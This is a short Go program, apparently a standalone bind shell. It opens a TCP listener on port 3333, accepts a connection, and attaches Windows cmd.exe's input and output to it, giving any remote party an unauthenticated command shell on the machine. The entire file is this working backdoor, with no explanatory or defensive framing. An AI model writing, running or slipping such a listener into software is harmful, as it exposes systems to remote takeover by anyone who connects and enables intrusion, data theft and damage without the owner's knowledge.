package main

import (
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", ":3333")
	if err != nil {
		log.Fatal("net.Listen()")
	}

	conn, err := listener.Accept()
	if err != nil {
		log.Fatal("listener.Accept()")
	}

	cmd := exec.Command("C:\\WINDOWS\\system32\\cmd.exe", "")
	cmd.Stdin = conn
	cmd.Stdout = conn

	err = cmd.Run()
	if err != nil {
		log.Fatal("cmd.Run()")
	}
}
